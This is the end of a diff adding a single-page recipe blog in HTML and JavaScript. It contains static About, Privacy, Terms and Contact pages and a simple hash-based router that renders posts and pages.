+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mediterranean Diet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Salad Recipe</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">High Protein Meals</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Fresh Vegetable Salad</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Eating</span>
+</div>
+                `
+            }
+
+
+        ];
+
+        // Static Legal Pages (Exact content and AdSense validation kept intact)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Core Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Katy's Recipes";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // Placeholder path
+
+        // Function to render home list
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=100&h=100&fit=crop&auto=format&q=80'">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=800&h=500&fit=crop&q=80'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 2px; font-size: 1.1rem; color: var(--accent-color);">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render static legal page
+        function renderPage(pageId) {
+            const page = pages[pageId];
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 10px; padding-bottom: 10px;">
+                        <h1 style="font-family: 'Cormorant Garamond', serif; font-size: 2.3rem; margin-bottom: 30px;">${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Function to render single post detail view
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=100&h=100&fit=crop&auto=format&q=80'">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=800&h=500&fit=crop&q=80'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 2px; font-size: 1.1rem; color: var(--accent-color);">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Client-side router logic
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Back/Forward button history handlers
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load routing checks
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
